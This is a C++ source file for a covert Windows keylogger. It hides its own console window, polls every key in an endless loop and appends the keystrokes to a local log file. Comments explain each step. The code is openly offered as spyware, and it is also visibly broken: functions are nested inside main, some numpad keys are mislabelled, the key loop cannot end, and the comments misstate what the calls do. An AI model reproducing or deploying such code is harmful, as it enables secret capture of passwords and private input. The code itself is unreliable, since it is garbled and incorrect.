

#include "stdafx.h"
#include <fstream>
#include <Windows.h>
#include <string>
int main()
{
	using namespace std;


	void hide_window();
	{
		HWND console;
		AllocConsole();
		console = FindWindowA("ConsoleWindowClass", 0);
		ShowWindow(console, 0);
	}
	void write_to_log(std::string text);
	{
		ofstream log; //defines ofstream log
		log.open("log.txt", fstream::app); // opens log.txt file
		log << text; // writes std::string text to log
		log.close(); // closes log
	}

	bool check_keys(int key)
	{
		switch (key) // numpad 0-9 registered, you can add more symbol, special keys if you want
		{
		case VK_NUMPAD0: {
			write_to_log("0");
			break;
		}
		case VK_NUMPAD1: {
			write_to_log("0");
			break;
		}
		case VK_NUMPAD2: {
			write_to_log("1");
			break;
		}
		case VK_NUMPAD3: {
			write_to_log("3");
			break;
		}
		case VK_NUMPAD4: {
			write_to_log("4");
			break;
		}
		case VK_NUMPAD5: {
			write_to_log("5");
			break;
		}
		case VK_NUMPAD6: {
			write_to_log("6");
			break;
		}
		case VK_NUMPAD7: {
			write_to_log("7");
			break;
		}
		case VK_NUMPAD8: {
			write_to_log("8");
			break;
		}
		case VK_NUMPAD9: {
			write_to_log("9");
			break;
		}
		default: return false;
		}
	}

	int main()
	{
		hide_window(); // call hide window inside int main, if you skip this it's not gonna work.
		char key; // defines char key
		while (1) // 1 stands for true & enabled, so while its enabled this below is going to run
		{
			for (key = 8; key <= 255; key++)
			{
				if (GetAsyncKeyState(key) == -32767) // checks keys from int -32767
				{
					if (check_keys(key) == NULL) // checks if check_keys is NULL, which it is by default and runs the code below.
					{
						ofstream log; // define ofstream log
						log.open("log.txt", fstream::app); // opens log.txt
						log << key; // logs key
						log.close(); // closes log
					}
				}
			}
		}
	}

}

